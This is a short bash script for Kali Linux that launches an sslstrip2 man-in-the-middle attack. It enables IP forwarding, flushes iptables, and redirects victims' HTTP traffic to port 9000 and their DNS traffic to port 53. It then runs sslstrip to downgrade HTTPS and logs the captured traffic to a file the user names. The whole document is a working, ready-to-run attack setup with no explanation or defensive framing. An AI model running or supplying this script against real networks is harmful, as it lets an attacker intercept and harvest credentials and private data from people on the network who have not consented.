#! /bin/bash
# start sslstrip

echo Starting sslstrip2 flushing and configuring iptables you will need to reboot Kali after running this
echo "1" > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000
iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
echo Enter filename
read -p 'Filename: ' filevar
sslstrip -l -a 9000 -w /root/sslstriplog/$filevar.log
echo sslstripping ended

